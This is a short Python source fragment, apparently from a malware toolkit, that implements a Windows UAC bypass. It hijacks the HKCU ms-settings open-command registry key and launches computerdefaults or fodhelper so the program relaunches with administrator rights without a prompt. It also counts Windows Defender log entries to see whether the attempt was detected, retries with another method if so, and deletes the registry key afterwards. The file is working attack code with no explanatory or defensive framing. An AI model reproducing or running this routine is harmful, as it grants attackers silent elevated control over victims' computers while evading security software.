import ctypes
import sys
import subprocess

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
        reg_add = f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"
        execute(reg_add)
        execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
        
        log_count = lambda: len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
        
        log_before, execute_cmd, log_after = [log_count(), execute("computerdefaults --nouacbypass" if method == 1 else "fodhelper --nouacbypass"), log_count()] if method in (1, 2) else [0, None, 0]
        execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
        return UACbypass(method + 1) if log_after > log_before else method != 3
    return False

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    return (sys.executable, True) if hasattr(sys, "frozen") else (__file__, False)
